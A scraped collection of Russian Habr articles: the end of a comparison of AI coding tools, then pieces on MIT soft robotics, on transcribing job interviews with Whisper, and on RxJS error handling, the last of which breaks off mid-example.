Облачные интеграции: Firebase, AWS, Vercel, Stripe, Clerk, Supabase
AI модели: Claude, различные собственные модели для рассуждений
Особенности развертывания: Автоматический деплой на Vercel или собственную инфраструктуру
v0 by Vercel (продолжение) 
Фреймворки/библиотеки: React, Next.js, shadcn/ui, Tailwind CSS
Архитектура:
Фокус на UI-компонентах и фронтенде
Нет непосредственной бэкенд-генерации
Облачные интеграции: Vercel для деплоя
AI модели: GPT-4o, собственные модели для генерации UI
Особенности развертывания: Экспорт кода компонентов для интеграции в проекты
Replit 
Языки программирования: JavaScript, Python, Ruby, Java, C++, Go и другие (50+ языков)
Фреймворки/библиотеки: React, Vue, Express, Django, Flask, Ruby on Rails и другие
Архитектура:
Интегрированная среда разработки в браузере
Полнофункциональный бэкенд и фронтенд
Базы данных: SQLite, MongoDB, PostgreSQL
Облачные интеграции: Собственная инфраструктура для хостинга, интеграции с GitHub
AI модели: Claude 3.7 Sonnet для Replit AI Agent, GPT-4 для Ghostwriter
Особенности развертывания: Мгновенный деплой внутри платформы, постоянный хостинг
Create 
Языки программирования: JavaScript, TypeScript, HTML, CSS
Фреймворки/библиотеки: React, Tailwind CSS, базовые инструменты веб-разработки
Архитектура:
Преимущественно фронтенд-ориентированная
Простой бэкенд через API
Облачные интеграции: Базовые возможности деплоя
AI модели: Не раскрываются конкретные модели
Особенности развертывания: Свободное использование, минимальный функционал
Trickle AI 
Языки программирования: JavaScript, HTML, CSS
Фреймворки/библиотеки: React, базовые веб-технологии
Архитектура:
Ориентирована на создание форм и простых веб-сайтов
Ограниченные возможности бэкенда
Облачные интеграции: GitHub Pages, базовые возможности деплоя
AI модели: Не указаны конкретные модели
Особенности развертывания: Упрощенный процесс, ориентация на нетехнических пользователей
Tempo 
Языки программирования: JavaScript, TypeScript
Фреймворки/библиотеки: React, специализация на React-компонентах
Архитектура:
Фокус на фронтенд-разработке React-приложений
Визуальный редактор компонентов
Облачные интеграции: Vercel, Netlify
AI модели: Не раскрыты конкретные модели
Особенности развертывания: Экспорт React-кода для интеграции в проекты
Softgen 
Языки программирования: JavaScript, TypeScript
Фреймворки/библиотеки: React, Firebase SDK
Архитектура:
Тесная интеграция с Firebase
Генерация фронтенда и бэкенда
Базы данных: Firestore
Облачные интеграции: Firebase (основная интеграция), Google Cloud Functions
AI модели: Не указаны конкретные модели
Особенности развертывания: Автоматический деплой на Firebase Hosting
Lazy AI 
Языки программирования: JavaScript, TypeScript, Python
Фреймворки/библиотеки: React, Node.js, Express
Архитектура:
Полнофункциональные бизнес-приложения
Бэкенд на Node.js
Базы данных: MongoDB, PostgreSQL
Облачные интеграции: AWS, Heroku, собственная инфраструктура
AI модели: Claude для кодогенерации
Особенности развертывания: Автоматический деплой в облако
HeyBoss 
Языки программирования: JavaScript, HTML, CSS
Фреймворки/библиотеки: React, базовые веб-технологии
Архитектура:
Простые приложения и веб-сайты
Базовые возможности бэкенда
Облачные интеграции: Ограниченные возможности
AI модели: Основано на OpenAI
Особенности развертывания: Упрощенный деплой для новичков
Creatr 
Языки программирования: JavaScript, HTML, CSS
Фреймворки/библиотеки: Базовые веб-технологии
Архитектура:
Простые лендинги и веб-сайты
Минимальные возможности бэкенда
Облачные интеграции: Базовый хостинг
AI модели: Не указаны конкретные модели
Особенности развертывания: Простой процесс для нетехнических пользователей
Data Button 
Языки программирования: JavaScript, TypeScript, Python, SQL
Фреймворки/библиотеки: React, Node.js, аналитические библиотеки
Архитектура:
Специализация на аналитических приложениях
Работа с данными и бизнес-аналитикой
Базы данных: широкая поддержка, SQL и NoSQL
Облачные интеграции: AWS, Google Cloud, собственная инфраструктура
AI модели: Не раскрыты конкретные модели
Особенности развертывания: Деплой на AWS и Google Cloud
Rork 
Языки программирования: JavaScript, TypeScript
Фреймворки/библиотеки: React Native (специализация)
Архитектура:
Фокус на мобильных приложениях
Кроссплатформенный подход (iOS/Android)
Облачные интеграции: Firebase, Expo
AI модели: Не указаны конкретные модели
Особенности развертывания: Собственная система для мобильного деплоя
IDE и редакторы кода 
Windsurf Editor (Codeium) 
Языки программирования: Поддержка большинства языков: JavaScript, TypeScript, Python, Java, C++, Go и другие
Фреймворки/библиотеки: Поддержка большинства популярных фреймворков
Архитектура:
Полноценный редактор кода с AI-агентом Cascade
Индексация и понимание кодовой базы
Облачные интеграции: GitHub, GitLab, Bitbucket
AI модели: Собственные модели Codeium, постоянно обновляемые
Особенности развертывания: Десктопное приложение для macOS, Windows, Linux
Cursor 
Языки программирования: Поддержка практически всех языков программирования
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Полноценный редактор кода на базе VS Code
Глубокое понимание кодовой базы
Облачные интеграции: GitHub, GitLab, интеграция с основными системами
AI модели: Claude, GPT-4, возможность выбора и настройки
Особенности развертывания: Десктопное приложение для macOS, Windows, Linux
Zed 
Языки программирования: Поддержка большинства языков благодаря Tree-sitter
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Высокопроизводительный редактор на Rust
Многопользовательский режим
Фокус на скорости работы
Облачные интеграции: GitHub, нативная поддержка Git
AI модели: Базовая интеграция с AI (не основной фокус)
Особенности развертывания: Десктопное приложение для macOS, Windows, Linux (в разработке)
Плагины и расширения 
Cline 
Языки программирования: Поддержка всех языков через VS Code
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Расширение для VS Code
Интеграция с терминалом и редактором
Model Context Protocol (MCP)
Облачные интеграции: Через VS Code, GitHub
AI модели: Claude 3.7 Sonnet
Особенности развертывания: Устанавливается как расширение VS Code
Roo Code 
Языки программирования: Поддержка всех языков через VS Code
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Форк Cline с улучшениями
Расширенная система памяти
Улучшенный интерфейс
Облачные интеграции: Через VS Code, GitHub
AI модели: Claude 3.7 Sonnet, расширенные возможности
Особенности развертывания: Устанавливается как расширение VS Code
avante.nvim 
Языки программирования: Поддержка языков через Neovim
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Плагин для Neovim
Эмуляция функций Cursor AI
Облачные интеграции: Через Neovim, Git
AI модели: Различные модели через API
Особенности развертывания: Устанавливается как плагин Neovim
backnotprop/prompt-tower 
Языки программирования: Универсальная поддержка
Фреймворки/библиотеки: Не специализируется на конкретных фреймворках
Архитектура:
Инструмент для управления контекстом в LLM
Расширение VS Code
Организация сложных промптов с кодом
Облачные интеграции: Минимальные
AI модели: Работает с различными LLM через API
Особенности развертывания: Устанавливается как расширение VS Code
Augment Code 
Языки программирования: Поддержка большинства языков программирования
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Расширение VS Code
Глубокое понимание кодовой базы
Корпоративные функции и интеграции
Облачные интеграции: GitHub, GitLab, Slack и другие корпоративные системы
AI модели: Собственные модели, оптимизированные для кода
Особенности развертывания: Расширение VS Code с корпоративными настройками
Инструменты командной строки 
claude-code 
Языки программирования: Поддержка большинства языков программирования
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Терминальный инструмент
Глубокая интеграция с кодовой базой
Командный интерфейс
Облачные интеграции: Git, GitHub, стандартные инструменты CI/CD
AI модели: Claude 3.5/3.7 Sonnet
Особенности развертывания: Устанавливается через пакетные менеджеры
aider 
Языки программирования: Python, JavaScript, Rust, Ruby, Go, C++, PHP, HTML, CSS и другие
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Терминальный инструмент
Тесная интеграция с Git
Понимание кодовой базы репозитория
Облачные интеграции: Git, GitHub
AI модели: GPT-3.5/GPT-4, OpenAI API, возможность использования различных моделей
Особенности развертывания: Устанавливается через pip (Python-пакет)
codename goose 
Языки программирования: Поддержка большинства языков
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Локальный, расширяемый AI-агент
Модульная система с MCP серверами
Открытая архитектура для расширений
Облачные интеграции: Git, GitHub, локальные интеграции
AI модели: Поддержка различных LLM, включая локальные модели
Особенности развертывания: Локальная установка, модульная структура
MyCoder.ai 
Языки программирования: Поддержка популярных языков
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Python-базированный CLI-инструмент
Интеграция с Git и GitHub
Параллельное выполнение
Облачные интеграции: Git, GitHub
AI модели: Не указаны конкретные модели
Особенности развертывания: Устанавливается через пакетные менеджеры
ai-christianson/RA.Aid 
Языки программирования: Поддержка популярных языков
Фреймворки/библиотеки: Универсальная поддержка
Архитектура:
Основан на LangGraph
Агентная система для задач разработки
Автономные возможности
Облачные интеграции: Git, GitHub
AI модели: Различные модели через LangGraph
Особенности развертывания: Homebrew, другие пакетные менеджеры
CodeSelect 
Языки программирования: Универсальная поддержка
Фреймворки/библиотеки: Не фокусируется на конкретных фреймворках
Архитектура:
Python-базированный инструмент
Анализ зависимостей между файлами
Подготовка контекста для AI
Облачные интеграции: Минимальные
AI модели: Подготовка для Claude, ChatGPT и других
Особенности развертывания: Простая установка через pip
Мобильные приложения 
VibeCode 
Языки программирования: JavaScript, Swift, Kotlin (генерация)
Фреймворки/библиотеки: Специализация на мобильных технологиях
Архитектура:
Мобильное приложение для iOS
Генерация кода мобильных приложений
Тестирование на устройстве
Облачные интеграции: Минимальные
AI модели: Не указаны конкретные модели
Особенности развертывания: Приложение для iOS, генерация приложений
8. Выводы 
Рекомендации по выбору инструмента 
Для новичков в программировании 
Lovable - Лучший выбор благодаря превосходной машине рассуждений и интуитивному интерфейсу
Bolt.new - Отличный вариант для быстрого получения работающего приложения
HeyBoss - Простой инструмент для самых базовых приложений без технических знаний
Create - Бесплатный инструмент для начинающих с простым интерфейсом
Для профессиональных разработчиков 
Cursor - Идеальный баланс между AI-ассистированием и контролем над кодом
Windsurf Editor - Агентный подход для высокой продуктивности с глубоким пониманием контекста
Augment Code - Превосходная работа с крупными кодовыми базами и корпоративными проектами
Zed - Лучший выбор для тех, кто ценит производительность и скорость работы
Для командной разработки 
Cursor - Отличная интеграция с системами контроля версий и процессами разработки
Augment Code - Корпоративные интеграции и понимание кодовой базы
Zed - Превосходный мультиплеерный режим и совместная работа
claude-code - Эффективная работа с репозиториями и существующим кодом
Для различных типов проектов 
Для веб-приложений:
Bolt.new - Полнофункциональные веб-приложения с минимальными усилиями
Lovable - Высококачественные приложения с интеграцией сервисов
Replit - Универсальная среда с широкой поддержкой технологий
Для мобильных приложений:
Rork - Специализированный инструмент для React Native приложений
VibeCode - Мобильное приложение для создания мобильных приложений
Bolt.new с Expo - Хорошая альтернатива для кросс-платформенной разработки
Для аналитических приложений:
Data Button - Специализированный инструмент для работы с данными
Replit - Гибкая среда для создания аналитических инструментов
Lazy AI - Хорошие возможности для бизнес-аналитики
Для UI компонентов:
v0 by Vercel - Специализированный инструмент для React/Next.js компонентов
Tempo - Фокус на React-компонентах и их визуализации
Windsurf Editor - Хорошие возможности для универсальных UI-задач
Общие тенденции и ограничения 
Ключевые тенденции:
Движение от простых инструментов автодополнения кода к агентным архитектурам с глубоким пониманием контекста
Рост числа специализированных инструментов для конкретных технологических стеков
Улучшение интеграции с существующими системами разработки и CI/CD
Повышение автономности инструментов, требующих меньше ручного вмешательства
Ограничения текущего поколения:
Сложности с очень крупными и сложными кодовыми базами
Ограниченное понимание бизнес-требований и доменной специфики
Проблемы с безопасностью и качеством генерируемого кода
Различное качество работы в зависимости от языка программирования
Высокие требования к вычислительным ресурсам для некоторых инструментов
9. Обобщающее сравнение 
Лидер по AI-интеграции: Lovable, Augment Code и Roo Code показывают наиболее глубокую и эффективную интеграцию с AI для разработки.
Лидер по автоматизации: Bolt.new предлагает самый высокий уровень автоматизации процесса создания приложений.
Лидер по универсальности: Cursor, Zed и Replit поддерживают наибольший спектр языков программирования и типов проектов.
Лидер по экосистемной интеграции: Cursor, Claude-code и Augment Code обеспечивают наилучшую интеграцию с существующими процессами разработки.
Лидер по интеграции с сервисами: Lovable и Data Button предлагают наиболее полную и удобную интеграцию с внешними сервисами и API.
Лидер по производительности: Zed выделяется своей скоростью и эффективностью работы.
Кому подойдёт Bolt.new: Идеален для быстрого создания прототипов и небольших проектов стартапами и индивидуальными разработчиками.
Кому подойдёт Lovable: Лучший выбор для нетехнических пользователей, стремящихся создать коммерческие приложения.
Кому подойдёт Cursor: Отличный выбор для профессиональных разработчиков, желающих интегрировать AI в существующие процессы.
Кому подойдёт claude-code: Идеален для разработчиков, предпочитающих терминал и работу с существующими репозиториями.
Кому подойдёт Zed: Лучший выбор для тех, кто ценит скорость и производительность редактора и совместную работу.
Для задач машинного обучения: Replit предлагает хорошую поддержку ML-фреймворков и языков, а также интегрированную среду для экспериментов.
10. Источники информации 
Официальная документация:
Bolt.new
Lovable
v0 by Vercel
Replit
Cursor
Claude-code
Zed
Cline
Windsurf Editor
Aider
GitHub репозитории:
Cursor
Claude-code
Zed
Aider
Codename goose
avante.nvim
prompt-tower
RA.Aid
Отзывы пользователей и сообщества:
Дискуссии на Reddit в сообществах r/ChatGPTCoding, r/programming, r/webdev
Обсуждения на Hacker News
Отзывы на Product Hunt
Обзоры на YouTube и специализированных блогах
Опыт пользователей из профессиональных сообществ разработчиков
Аналитические статьи:
Сравнительные обзоры vibe coding инструментов на Medium, DEV.to и специализированных платформах
Технические блоги компаний-разработчиков
Исследования трендов в области AI-ассистированной разработки
Этот сравнительный анализ основан на данных, доступных по состоянию на апрель 2025 года, и представляет текущее состояние рынка инструментов vibe coding. Технологическая область быстро развивается, поэтому рекомендуется проверять последние обновления и возможности инструментов перед принятием решения.
Авторы статьи: Дмитрий Жечков Yandex Cloud и Давид Меркулов Ex AI Solution architect @ Yandex "
Мягкие роботы и ИИ: Как MIT переосмысливает будущее робототехники,https://habr.com/ru/articles/910252/,"Робототехника переживает бум: от складских манипуляторов до гуманоидов, обещающих подавать кофе. Но пока мир зациклен на жёстких, антропоморфных машинах, Даниэла Рус, директор Лаборатории компьютерных...","Робототехника переживает бум: от складских манипуляторов до гуманоидов, обещающих подавать кофе. Но пока мир зациклен на жёстких, антропоморфных машинах, Даниэла Рус, директор Лаборатории компьютерных наук и искусственного интеллекта MIT (CSAIL), предлагает радикально иной подход — мягкие роботы. Представьте гибких, податливых механизмы, способных плавать среди кораллов или даже растворяться в организме после микрооперации. В этой статье мы разберём, как мягкая робототехника, усиленная ИИ, меняет представление о роботах, какие технологии стоят за этим, и почему это важно для будущего.
Проблема: Ограничения традиционных роботов
Современные роботы — это, как правило, жёсткие конструкции из металла и пластика, оптимизированные для заводов, складов или демонстрационных шоу. Они эффективны в контролируемых условиях, но сталкиваются с ограничениями:
Хрупкость окружения: Жёсткие роботы могут повредить деликатные экосистемы (например, коралловые рифы) или быть неэффективными в сложных средах, таких как подводные течения.
Ограниченная адаптивность: Антропоморфные формы не всегда подходят для специфических задач, таких как неинвазивные операции или мониторинг природы.
Высокая стоимость и риски: Крупные, дорогие роботы требуют сложного обслуживания и могут нанести ущерб при сбоях.
Даниэла Рус, лауреат медали Эдисона от IEEE (ранее награждённой Беллом и Теслой), считает, что робототехника должна выйти за рамки гуманоидов и жёстких конструкций. Её подход, известный как мягкая робототехника, переосмысливает, что такое робот: от бумажных оригами с мотором до съедобных механизмов.
Мягкие роботы и их возможности
Мягкая робототехника фокусируется на гибких, биомиметичных материалах, таких как силикон или биосовместимые полимеры, позволяя создавать роботов, которые:
Адаптируются к среде, как живые организмы.
Минимизируют ущерб для окружающей среды или человека.
Выполняют задачи, недоступные жёстким конструкциям.
Команда Рус в CSAIL разработала несколько прототипов, демонстрирующих потенциал:
Робот-черепаха Crush: Оснащён силиконовыми ластами и камерами, предназначен для мониторинга морской жизни. Его мягкая структура позволяет маневрировать среди кораллов без повреждений, хотя баланс между гибкостью и устойчивостью к течениям остаётся инженерной задачей.
Съедобный робот: Изготовлен из колбасной оболочки с магнитом, способен выполнять неинвазивные микрооперации внутри тела и растворяться после выполнения задачи. Это открывает перспективы для медицины, где традиционные инструменты слишком инвазивны.
Оригами-роботы: Простейшие механизмы, такие как бумажные цветы с мотором, показывают, что роботом может быть любое движущееся устройство, независимо от материала.
Эти разработки ломают стереотипы: робот — это не обязательно антропоморфная машина, а инструмент, форма которого определяется задачей.
Роль ИИ: Мозги для мягких тел
Мягкие роботы требуют интеллектуального управления, чтобы их гибкость не стала хаосом. ИИ играет ключевую роль, обеспечивая:
Адаптивное управление:
Liquid Networks: Новая архитектура, вдохновлённая нейронной активностью червей (C. elegans). Эти компактные алгоритмы работают непосредственно на устройстве, а не на внешних серверах, и обучаются на сотнях GPU вместо десятков тысяч. Они позволяют роботам, вроде черепахи Crush, интуитивно адаптироваться к сложным физическим средам, например, обходить препятствия под водой. Например, Liquid Networks помогают роботу интерпретировать незнакомые объекты или течения, минимизируя риски сбоев.
Генеративный дизайн:
Система Text-to-Robot использует ИИ, обученный на законах физики, для создания конструкций по текстовым запросам. Например, запрос «сделай робота, который варит суп» может породить гибкую манипуляторную руку, оптимизированную для кухонных задач. Например, в лаборатории CSAIL ИИ спроектировал трёхпалую руку для работы со шприцем, что открывает перспективы для модульных медицинских роботов с насадками для разных инструментов.
Обработка данных: Генеративные ИИ-модели помогают роботам обрабатывать сенсорные данные, распознавая объекты или условия, на которые они не были явно обучены.
Однако ИИ приносит и вызовы, такие как:
Физические ограничения: Генеративные модели могут ошибаться в восприятии физического мира, что критично для роботов, работающих в реальных условиях.
Ресурсоёмкость: Многие ИИ-модели требуют отдельных вычислительных систем, что усложняет их интеграцию в компактные устройства.
Технические вызовы мягкой робототехники
Создание мягких роботов — это не только про ИИ, но и про инженерию:
Материалы: Найти баланс между гибкостью и прочностью. Слишком мягкий робот, как черепаха Crush, может быть унесён течением; слишком жёсткий — потеряет преимущества мягкости.
Водозащита: Защита электроники в подводных роботах, таких как Crush, остаётся проблемой, требующей новых подходов к герметизации.
Дизайн: Процесс создания мягких роботов остаётся медленным и итеративным. Text-to-Robot ускоряет его, но пока не заменяет инженерный опыт.
Рус и её команда также основали стартап Liquid AI, который применяет Liquid Networks к реальным задачам, таким как автономные автомобили, демонстрируя коммерческий потенциал технологий.
Перспективы и значение для индустрии
Мягкие роботы, усиленные ИИ, открывают новые горизонты:
Медицина: Съедобные роботы могут революционизировать неинвазивную хирургию, устраняя необходимость в разрезах.
Экология: Мягкие роботы, как Crush, позволяют мониторить экосистемы без вреда, что актуально для России с её обширными природными территориями, такими как Байкал или Арктика.
Бытовые приложения: Гибкие роботы могут интегрироваться в дома, выполняя задачи от уборки до готовки, без громоздких конструкций.
В России робототехника тоже развивается: Яндекс и Сбер экспериментируют с роботами для доставки и логистики, но мягкие роботы пока остаются нишевой темой. Исследования MIT могут вдохновить локальные команды, особенно в области экологического мониторинга или медицинских технологий.
По прогнозам Gartner, к 2030 году 80% людей будут ежедневно взаимодействовать с ИИ-роботами, и мягкие конструкции могут стать значимой частью этого тренда. Однако для масштабирования нужны прорывы в материалах, энергоэффективности и ИИ-архитектурах.
Выводы?
Мягкая робототехника — это не просто альтернатива гуманоидам, а переосмысление того, как технологии интегрируются в нашу жизнь. Даниэла Рус видит будущее, где роботы будут такими же разнообразными, как живые существа: от бумажных оригами до съедобных хирургов. Её работа показывает, что ИИ и инженерия могут не только автоматизировать, но и вдохновлять.
Как вы видите мягких роботов в будущем? Применяли ли вы ИИ для генеративного дизайна или робототехники? Делитесь опытом, идеями или критикой в комментариях — обсудим, как эта технология изменит нашу реальность
Присоединяйтесь к нашему тг-каналу: обсуждаем свежие исследования, делимся инсайтами и разбираем, как ИИ меняет мир."
Как я научился анализировать собственные собесы с помощью Whisper (и почему это нужно каждому айтишнику и не только),https://habr.com/ru/articles/910246/,"Собеседования — всегда стресс. Я замечал, что после каждого интервью трудно вспомнить детали: какие вопросы задавали, как именно я отвечал, где были ошибки или неточности. А переслушивать запись, кото...","Собеседования — всегда стресс. Я замечал, что после каждого интервью трудно вспомнить детали: какие вопросы задавали, как именно я отвечал, где были ошибки или неточности. А переслушивать запись, которая может длиться от часа и выше это долго и неэффективно.
Задумался: а что если использовать что‑то, что автоматически превратит аудиозапись интервью в текст? Так я открыл для себя Whisper от OpenAI. Ниже подробности о его применении.

⚠️ Важно: записывать интервью можно только с согласия всех участников, иначе это может преследоваться законом.
Или
Как это вообще работает: Whisper, Python и GPT
Процесс выглядит так:
Whisper (модель от OpenAI) берёт аудиофайл с собеседованием и превращает его в обычный текст (транскрибирует).
Python-скрипт - это просто инструмент, который удобно запускает Whisper локально, без отправки данных в интернет. (Ссылка на Github в конце статьи)
Полученный текст мы отправляем в GPT (например, в ChatGPT), который уже анализирует:
качество ответов,
сильные и слабые стороны,
даёт советы, как улучшить ответы на следующих интервью.
Как работает проект (схема):
Таким образом, вы получаете максимально полезный инструмент анализа своих навыков коммуникации и профессиональных компетенций, не выходя из дома и без помощи внешних консультантов
Что такое Whisper и почему он интереснее других
Whisper - это open-source модель от OpenAI, которая способна качественно переводить аудиозаписи в текст. Основные плюсы:
Бесплатная и доступная всем.
Неплохо работает с русским и английским языками.
Легко настраивается и запускается локально.
В отличие от других сервисов, Whisper не требует отправки данных на внешние серверы. Это гарантирует конфиденциальность и безопасность.
Зачем это QA-инженеру или разработчику?
Анализировать свои ответы: понимать, какие ошибки допускаешь и что можно улучшить.
Самоподготовка: готовиться к следующим интервью, отрабатывая слабые места.
Рост навыков коммуникации: видеть, насколько понятно и структурированно говоришь о своих навыках.
Пример запроса к GPT
После получения файла с расшифровкой интервью (result.txt), вы можете использовать следующий пример промта в GPT:
Проанализируй моё интервью и дай подробные рекомендации по улучшению моих ответов. Выдели сильные стороны, слабые места и предложи конкретные советы, как подготовиться лучше в следующий раз. Вот текст интервью:
[Вставьте сюда текст из файла result.txt] либо же сам файл
Мой результат: что я узнал благодаря Whisper
Используя Whisper для расшифровки своих интервью, я смог:
Увидеть четко, где «плыву» в ответах.
Определить, какие вопросы чаще всего меня сбивают.
Улучшить структуру своих ответов.
Это помогло мне порефлексировать и сделать работу над ошибками.
Почему это пригодится тебе
Этот инструмент полезен:
QA-инженерам (для подготовки к техническим и поведенческим интервью).
Разработчикам (чтобы отточить навыки самопрезентации и интервью).
HR и менеджерам (для анализа кандидатов и улучшения коммуникации).
Где скачать и посмотреть проект
Подробная пошаговая инструкция и сам проект находятся на GitHub: voice-to-text-sobes
Лицензия: MIT (используйте свободно)
Заключение: почему стоит попробовать уже сейчас
Этот проект помог мне значительно улучшить понимание своих слабых и сильных сторон на интервью. Whisper позволяет эффективно анализировать каждую деталь собеседования и становиться вашим личным коучем в подготовке.
Делитесь мнениями."
Пятый шаг в мир RxJS: Обработка ошибок,https://habr.com/ru/articles/910232/,"Первый шаг в мир RxJS: знакомство с Observables
Второй шаг в мир RxJS: Операторы RxJS — как изучать и зачем они нужны
Третий шаг в мир RxJS: комбинирование потоков в RxJS
Четвертый шаг в мир RxJs: нез...","Первый шаг в мир RxJS: знакомство с Observables
Второй шаг в мир RxJS: Операторы RxJS — как изучать и зачем они нужны
Третий шаг в мир RxJS: комбинирование потоков в RxJS
Четвертый шаг в мир RxJs: незавершенные потоки — тихие убийцы приложений
Вы уже встречались с этими ""веселыми"" историями, когда разработчик заканчивает работу над задачей, она проходит тестирование, отправляется в прод, а там встречается неожиданным отказом какого-нибудь мелкого метода api и укладывает всё приложение так, что пользователи наблюдают только белый экран?
Я в своё время познакомился с ними чересчур близко... И, честно сказать, потоки RxJs прекрасные учителя - тебе не захочется снова повторять их уроки. Чему же они нас учат? В первую очередь тому, что не стоит доверять внешним источникам; вы не контролируете ни соединение с сервером, ни api-сервис, а значит не имеете никаких оснований слепо доверять им и ожидать безотказной работы.
Если ваш бэк имеет коэффициент доступности в пять девяток (отличный результат!), он по-прежнему не работает несколько минут в году. Отказы бывают у любых систем.
Типичные сценарии новичков
Призрачные данные
this.api.getData().subscribe(
    data => this.render(data) // А если data === undefined?
);
Немой сбой
combineLatest(
    loadUsers(),
    loadProducts() // Если упадёт здесь — всё остановится
).subscribe();
Эффект домино
interval(1000).pipe(
    switchMap(() => new Observable(o => {
        o.error('Error!')
    }))
).subscribe(); // При ошибке падает весь поток, данные перестают обновляться
«Хороший разработчик пишет код. Отличный — предвидит, как он сломается»
— Неизвестный Архитектор*
Базовые операторы для работы с ошибками: ваш набор ""скорой помощи"" (актуально для RxJS 7.8+)
catchError: цифровая аптечка
Как это работает
Представьте, что ваш Observable — это курьерская служба. catchError — это страховая компания, да, она не сможет вернуть потерянный при доставке товар, но попробует предложить замену (денежная компенсация вас устроит?).
Практика
import {catchError} from 'rxjs/operators';
import {of} from 'rxjs';

const request = new Observable(o => {
    o.error('Error!');
    o.complete();
});
request.pipe(
    catchError(error => {
        console.log(error); // Логируем проблему
        return of([]); // Возвращаем пустой массив как fallback
    })
).subscribe(orders => {
    console.log(orders); // Всегда получим данные
});
Здесь и далее в примерах я буду приводить именно такую форму, с самописной  Observable. Давайте договоримся, что в реальности там будет что-то в духе this.http.get('/api/orders'); для примера эта запись не подходит, потому что её придется переписывать для собственных экспериментов, а с Observable можно скопировать код и проводить опыты. Так же вместо записей в духе this.logService.report(error) я оставляю console.log(error), по той же причине.
retry: умный повтор с контролем
Философия
Как хороший бариста делает кофе заново при ошибке — так retry повторяет запросы. Но помните: не все операции идемпотентны!
Пример с конфигурацией
import {retry, timer} from 'rxjs';

const request = new Observable(o => {
    o.error('Error!');
    o.complete();
});
request.pipe(
    retry({
        count: 3, // Максимум 3 попытки
        delay: (error, retryCount) => timer(1000 * retryCount) // Задержка растёт: 1s, 2s, 3s
    })
).subscribe();
Правила безопасности
Никогда не используйте для POST/PUT-запросов
Всегда устанавливайте разумный лимит попыток
Комбинируйте с задержками для защиты сервера
finalize: гарантированная уборка
Почему это важно
Война войной, а обед по расписанию, finalize выполнится при любом исходе:
Успешное завершение
Ошибка
Ручная отписка
Идеальный кейс
this.loading = true;
const request = new Observable(o => {
    o.error('Error!');
    o.complete();
});
request.pipe(
    finalize(() => {
        this.loading = false; // Всегда сбрасываем флаг
        console.log('DataLoadCompleted');
    })
).subscribe();
Почему мы больше не используем retryWhen?
Устаревший подход
retryWhen объявлен deprecated в RxJS 7.8+
Новые возможности
Объект конфигурации retry проще и безопаснее:
retry({
    count: 4,
    delay: (_, i) => timer(1000 * 2 ** i) // Экспоненциальная задержка
})
3. Читаемость кода
Конфиг-объект делает логику повторов явной
Советы из боевого опыта
Правило трёх уровней
Уровень 1: Повтор запроса (retry)
Уровень 2: Fallback-данные (catchError)
Уровень 3: Глобальный обработчик
Правило 80/20
80% ошибок обрабатывайте через catchError, 20% — через сложные стратегии.
Логирование — как дневник
Всегда записывайте:
Тип ошибки
Контекст операции
Временную метку
Тестируйте failure-сценарии
На каждый десяток позитивных тестов добавляйте 1-2 теста с ошибками.
""Код без обработки ошибок — как дом без пожарного выхода: работает, пока не случится беда""
Примеры использования операторов: от теории к практике
Сценарий 1: Грациозная деградация данных
Проблема
Приложение падает, если API возвращает 404 на странице товара.
Решение с catchError
this.product$ = this.http.get(`/api/products/${id}`).pipe(
    catchError(error => {
        if (error.status === 404) {
            return of({
                id,
                name: 'Товар временно недоступен',
                image: '/assets/placeholder.jpg'
            });
        }
        throw error; // Пробрасываем другие ошибки
    })
);
Эффект:
Пользователь видит информативную карточку вместо белого экрана.
Сценарий 2: Умный повтор запросов
Проблема
Мобильные клиенты часто теряют связь при загрузке ленты новостей.
Решение с retry
this.http.get('/api/feed').pipe(
    retry({
        count: 3, // Максимум 3 попытки
        delay: (error, retryCount) => timer(1000 * retryCount) // Линейная задержка
    }),
    catchError(err => {
        this.offlineService.showWarning();
        return EMPTY;
    })
).subscribe();
Статистика:
Уменьшение ошибок загрузки в условиях нестабильной сети.
Сценарий 3: Комплексная обработка платежей
Проблема
Нужно гарантировать выполнение клиринга даже при ошибках.
Комбинация операторов
processPayment(paymentData).pipe(
    retry(2), // Повтор для временных сбоев
    catchError(error => {
        this.fallbackProcessor.process(paymentData);
        return EMPTY;
    }),
    finalize(() => {
        this.cleanupResources();
        this.logService.flush(); // Гарантированная запись логов
    })
).subscribe();
Архитектурный совет:
Всегда разделяйте ""повторяемые"" и ""фатальные"" ошибки.
Сценарий 4: Фоновые синхронизации
Проблема
Фоновый процесс синхронизации ""зависает"" при ошибках.
Решение с finalize
this.syncJob = interval(30_000).pipe(
    switchMap(() => this.syncService.run()),
    finalize(() => {
        this.jobRegistry.unregister('background-sync');
        this.memoryCache.clear();
    })
).subscribe();
Важно:
Даже при ручной отписке ресурсы будут освобождены.
Советы из боевых условий
Паттерн ""Слоёная защита""
Комбинируйте операторы как фильтры:
Поток → retry(3) → catchError → finalize
Метрики — ваши друзья 
Добавляйте счётчики ошибок:
catchError(error => {
    this.metrics.increment('API_ERRORS');
    throw error;
})
Тестируйте крайние случаи 
Используйте marble-диаграммы для моделирования ошибок:
cold('--a--#', null, new Error('Timeout')).pipe(...)
Стратегии обработки ошибок: как не закопаться в исключениях
1. Стратегия ""Острова безопасности""
Концепция
Разбивайте поток на независимые сегменты с локальной обработкой ошибок. Как водонепроницаемые отсеки в корабле.
Реализация
merge(
    this.loadUserData().pipe(
        catchError(() => of(null)) // Ошибка не сломает другие потоки
    ),
    this.loadProducts().pipe(
        retry(2) // Своя политика повторов
    )
).pipe(
    finalize(() => this.hideLoader()) // Общая точка очистки
);
Эффект:
Ошибка в одном потоке не останавливает работу всей системы.
2. Стратегия ""Эшелонированная защита""
Трехуровневая модель
Уровень запроса:
Повторы для временных сбоев
this.http.get(...).pipe(retry(3))
Уровень компонента:
Fallback-данные
catchError(() => this.cache.getData())
Уровень приложения:
Глобальный перехватчик ошибок
@Injectable()
export class GlobalErrorHandler implements ErrorHandler {
    handleError(error) {
        this.sentry.captureException(error);
    }
}
3. Стратегия ""Умного повтора""
Когда использовать
Сервисы с нестабильным соединением
Критически важные операции
Фоновые синхронизации
Шаблон ""Экспоненциальный бекофф""
retryWhen(errors => errors.pipe(
    retry({
        count: 4,
